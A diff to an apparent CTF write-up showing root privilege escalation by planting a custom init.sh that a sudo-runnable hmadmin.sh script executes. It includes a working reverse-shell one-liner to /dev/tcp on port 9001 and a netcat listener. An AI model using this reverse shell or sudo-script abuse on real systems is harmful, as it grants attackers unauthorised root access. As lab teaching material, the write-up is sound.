@@ -5,12 +5,14 @@ by fluffyhake
 By running a existing script called `hmadmin.sh` with a custom `init.sh` script we can execute any command as root. By doing this, we can open a reverse shell as root and locate the flag in the root home directory.
 
 ### Example
+Target:
 ```
 [prime@ip-10-128-2-180 ~]$ echo 'sh -i >& /dev/tcp/10.128.2.186/9001 0>&1' > /home/activemq/init.sh
 [prime@ip-10-128-2-180 ~]$ sudo /opt/CSCOlumos/rcmds/hmadmin.sh  
 sudo /opt/CSCOlumos/rcmds/hmadmin.sh  
 
 ```
+Host listening for reverse shell:
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9001
